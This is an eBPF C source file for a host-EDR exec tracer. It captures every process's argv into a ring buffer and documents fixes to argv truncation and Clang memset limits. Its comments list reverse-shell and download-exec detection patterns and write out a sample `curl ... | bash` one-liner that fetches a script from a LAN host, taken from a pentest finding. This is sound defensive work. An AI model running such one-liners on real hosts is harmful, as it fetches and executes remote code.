// execsnoop.bpf.c — CO-RE eBPF: every process exec (sched_process_exec tracepoint) → ringbuf.
//
// The LOW-OVERHEAD production host-telemetry producer: unlike host-telemetry-export.sh (which polls
// /proc and MISSES processes shorter than the interval), this fires on every exec in-kernel. The
// loader formats each event as an `ingest_host_event` JSON line ({"type":"process",…}) for the
// evidence graph's HOST layer (ADR 0009). Same relationship as napse-capture (XDP) vs senzorium-flow.
//
// Compiled on the BUILD HOST only (clang + kernel BTF); the immutable device never has clang. Ships a
// signed .bpf.o (like napse_detect.bpf.o). See the Makefile.
//
// ARGV CAPTURE (2026-07-06 fix — closed a live host-EDR blind spot): `sched_process_exec` alone only
// carries the exec'd filename, never argv, so `host_edr::classify_exec`'s arg-pattern rules
// (`bash -i`, `nc -e`, `/dev/tcp`, `curl|sh`, …) could never fire — every emitted event's `cmdline`
// was the bare binary path. The classic execsnoop pattern (bcc/libbpf-tools) fixes this by ALSO
// hooking the syscall ENTRY tracepoints (`sys_enter_execve`/`sys_enter_execveat`), where argv is
// still a live, readable userspace pointer array (before the exec replaces the process image), and
// stashing it in a per-pid scratch map keyed by tgid. `sched_process_exec` — which fires only on a
// SUCCESSFUL exec, in the same tgid — then looks the entry up and folds it into the emitted event,
// deleting the scratch entry so it never lingers. A failed exec (no matching sched_process_exec)
// leaves a stale scratch entry; the map is BPF_MAP_TYPE_LRU_HASH specifically so those get evicted
// under pressure instead of growing unbounded — this program has no separate reaper.
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "GPL";

#define COMM_LEN  16
#define FNAME_LEN 128

// Bounded, fixed-slot argv capture: ARGSIZE bytes per argument (NUL-included), MAX_ARGS real
// arguments + one reserved slot for a "..." truncation marker. Fixed, compile-time-constant slot
// offsets (the capture loop is fully #pragma-unroll'd) keep every bpf_probe_read_user_str() call's
// destination a static offset — the simplest, most verifier-friendly shape for this, and the same
// trick libbpf-tools' execsnoop uses.
//
// F2-secondary (2026-07-06 Pi4 pentest finding): ARGSIZE was 32 — a `curl -s http://x/y.sh |
// bash` download-exec one-liner is passed to execve() as a SINGLE argv element (`sh -c "curl ...
// | bash"`), and 32 bytes truncated it to `curl -s http://10.200.0.1/x.sh ` — the `| bash` suffix
// `host_edr::classify_exec`'s `pipes_to_interpreter` rule keys on never survived the capture, so
// download-exec silently escaped detection (reverse-shell/`/dev/tcp`/python one-liners still
// matched, since THEIR tell lands inside the first 32 bytes). Raised to 160 (>= the requested
// 128-byte floor, plus headroom: `bpf_probe_read_user_str`'s copy includes the NUL terminator, so
// a full 128-*visible*-byte argument needs 129 slot bytes minimum to round-trip untruncated).
// 160*16 = 2560 bytes total, held in the PERCPU_ARRAY "heap" map (`argv_heap` below) and copied
// into the ringbuf reservation — NEITHER is the 512-byte BPF *stack frame* the verifier bounds;
// map values and ringbuf reservations have their own, much larger limits, so this stays
// verifier-safe. 15 real args still comfortably covers every LOLBin/reverse-shell one-liner this
// ruleset matches; see `modules/host-telemetry/loader/src/main.rs`'s matching `ARGSIZE`/offset
// constants, which MUST stay byte-for-byte in sync with this file.
#define ARGSIZE      160
#define MAX_ARGS     15
#define NUM_SLOTS    (MAX_ARGS + 1)              // +1 = the truncation-marker slot
#define ARGV_BUF_LEN (ARGSIZE * NUM_SLOTS)        // 2560

struct exec_event {
    __u32 pid;
    __u32 ppid;
    __u8  comm[COMM_LEN];
    __u8  filename[FNAME_LEN];
    __u8  argv[ARGV_BUF_LEN]; // NUM_SLOTS fixed ARGSIZE-byte slots, each independently NUL-terminated
    __u8  nargs;              // number of valid slots in argv[] (0..NUM_SLOTS)
    __u8  truncated;          // 1 if more argv entries existed than NUM_SLOTS could hold
    __u8  _pad[2];            // explicit — keep sizeof() a stable, documented constant (2716 bytes)
};

// force the type into BTF so the loader (libbpf-rs) can generate the skeleton struct
struct exec_event *_unused_ev __attribute__((unused));

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 20); // 1 MiB
} events SEC(".maps");

struct argv_buf {
    __u8 buf[ARGV_BUF_LEN];
    __u8 nargs;
    __u8 truncated;
};

// tgid -> in-flight argv, filled at sys_enter_execve(at) and consumed by sched_process_exec.
// LRU so a failed exec (execve() returns an error — no matching sched_process_exec ever fires)
// can never leak an entry forever; it just ages out under pressure instead.
struct {
    __uint(type, BPF_MAP_TYPE_LRU_HASH);
    __uint(max_entries, 4096);
    __type(key, __u32);
    __type(value, struct argv_buf);
} argv_scratch SEC(".maps");

// `struct argv_buf` (512+ bytes) is too big for the 512-byte BPF stack frame limit alongside the
// rest of a program's locals — the classic libbpf-tools workaround: build it in a single-slot
// PERCPU_ARRAY "heap" map instead of on-stack, then use the returned pointer directly. Per-CPU so
// two exec()s racing on different CPUs never share/corrupt the same scratch slot; a single thread
// can only be inside one execve(at) at a time, so index 0 per CPU is always safe to reuse.
struct {
    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, struct argv_buf);
} argv_heap SEC(".maps");

// Read argv[] (still valid userspace pointers at syscall ENTRY, before exec() replaces the image)
// into a fixed-slot scratch buffer keyed by this thread's tgid. Shared by both entry hooks below.
// Fail-safe by construction: any read failure just stops capturing early (whatever was already
// read stays, so a partial cmdline beats none) or, if even the first pointer read fails, leaves NO
// scratch entry at all — sched_process_exec's lookup then misses and the loader falls back to the
// binary path (today's pre-argv behavior), never a crash and never a dropped exec event.
static __always_inline void capture_argv(const char *const *argv)
{
    __u32 zero = 0;
    struct argv_buf *ab = bpf_map_lookup_elem(&argv_heap, &zero);
    if (!ab)
        return; // unreachable in practice (fixed-size, always-present slot 0) — fail-safe anyway
    // F2-secondary (2026-07-06): `__builtin_memset(ab, 0, sizeof(*ab))` compiled fine when ARGSIZE
    // was 32 (sizeof(*ab) ~514B); at ARGSIZE=160 (sizeof(*ab) ~2562B) Clang's BPF backend refuses
    // it ("A call to built-in function 'memset' is not supported" — verified empirically: Clang's
    // bpf target only inlines __builtin_memset/memcpy up to ~1024 bytes, else it tries an actual
    // libcall the BPF target can't resolve). Fixed with an explicit, #pragma-unroll'd byte loop —
    // `volatile` is REQUIRED, not decorative: without it Clang's loop-idiom-recognition pass turns
    // this very loop straight back into the same unsupported memset call (confirmed empirically).
    // Verifier-safe: straight-line stores, no branches, ~2.6K instructions fully unrolled — well
    // inside any post-5.2-kernel's 1M-instruction verifier budget (this repo's kernels are 6.x).
    {
        volatile __u8 *z = (volatile __u8 *)ab;
        #pragma unroll
        for (int i = 0; i < (int)sizeof(*ab); i++)
            z[i] = 0;
    }

    __u32 pid = bpf_get_current_pid_tgid() >> 32;

    #pragma unroll
    for (int i = 0; i < MAX_ARGS; i++) {
        const char *argp = NULL;
        if (bpf_probe_read_user(&argp, sizeof(argp), &argv[i]) < 0)
            return; // can't even read the pointer slot — abandon; loader falls back to filename
        if (!argp) {
            ab->nargs = i;
            bpf_map_update_elem(&argv_scratch, &pid, ab, BPF_ANY);
            return; // normal end of argv (NULL terminator) — not a truncation
        }
        long n = bpf_probe_read_user_str(&ab->buf[i * ARGSIZE], ARGSIZE, argp);
        if (n < 0) {
            ab->nargs = i; // this one arg failed mid-read — keep everything captured so far
            bpf_map_update_elem(&argv_scratch, &pid, ab, BPF_ANY);
            return;
        }
        ab->nargs = i + 1;
    }

    // Filled all MAX_ARGS slots without hitting a NULL terminator: peek one more pointer to tell
    // a real truncation (more args exist) from an exact fit, and mark it honestly either way.
    const char *more = NULL;
    if (bpf_probe_read_user(&more, sizeof(more), &argv[MAX_ARGS]) == 0 && more) {
        __builtin_memcpy(&ab->buf[MAX_ARGS * ARGSIZE], "...", 4);
        ab->nargs = MAX_ARGS + 1;
        ab->truncated = 1;
    }
    bpf_map_update_elem(&argv_scratch, &pid, ab, BPF_ANY);
}

// generic syscall-entry tracepoint layout (stable across sys_enter_* tracepoints): args[6] holds
// the raw syscall arguments in declaration order. execve(filename, argv, envp) -> argv is args[1].
SEC("tracepoint/syscalls/sys_enter_execve")
int handle_execve_enter(struct trace_event_raw_sys_enter *ctx)
{
    capture_argv((const char *const *)ctx->args[1]);
    return 0;
}

// execveat(fd, filename, argv, envp, flags) -> argv is args[2].
SEC("tracepoint/syscalls/sys_enter_execveat")
int handle_execveat_enter(struct trace_event_raw_sys_enter *ctx)
{
    capture_argv((const char *const *)ctx->args[2]);
    return 0;
}

SEC("tracepoint/sched/sched_process_exec")
int handle_exec(struct trace_event_raw_sched_process_exec *ctx)
{
    struct exec_event *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e)
        return 0;
    // reserve returns UNINITIALIZED memory; zero it so a short/faulting filename read (or a
    // scratch-map miss leaving argv unset) can't leak stale kernel bytes, and comm/filename/argv
    // slots are always NUL-terminated for the loader.
    //
    // F2-secondary: same Clang bpf-target __builtin_memset size limit as capture_argv() above
    // (sizeof(*e) is now ~2716B at ARGSIZE=160, past the ~1024B inline-lowering ceiling) — same
    // fix, same `volatile`-required rationale (see the comment there).
    {
        volatile __u8 *z = (volatile __u8 *)e;
        #pragma unroll
        for (int i = 0; i < (int)sizeof(*e); i++)
            z[i] = 0;
    }

    struct task_struct *task = (struct task_struct *)bpf_get_current_task();
    __u32 pid = bpf_get_current_pid_tgid() >> 32;
    e->pid  = pid;
    e->ppid = BPF_CORE_READ(task, real_parent, tgid);
    bpf_get_current_comm(&e->comm, sizeof(e->comm));

    // the tracepoint carries the exec'd filename as a __data_loc: offset in the low 16 bits.
    unsigned short off = ctx->__data_loc_filename & 0xFFFF;
    bpf_probe_read_kernel_str(&e->filename, sizeof(e->filename), (void *)ctx + off);

    // fold in argv captured at sys_enter_execve(at) for this same tgid, if any (see capture_argv).
    struct argv_buf *ab = bpf_map_lookup_elem(&argv_scratch, &pid);
    if (ab) {
        // F2-secondary: same Clang bpf-target __builtin_memcpy size limit as the two memsets
        // above (sizeof(e->argv) is now 2560B at ARGSIZE=160) — same fix, same rationale.
        {
            volatile __u8 *d = (volatile __u8 *)e->argv;
            const __u8 *s = (const __u8 *)ab->buf;
            #pragma unroll
            for (int i = 0; i < (int)sizeof(e->argv); i++)
                d[i] = s[i];
        }
        e->nargs = ab->nargs;
        e->truncated = ab->truncated;
        bpf_map_delete_elem(&argv_scratch, &pid);
    }

    bpf_ringbuf_submit(e, 0);
    return 0;
}
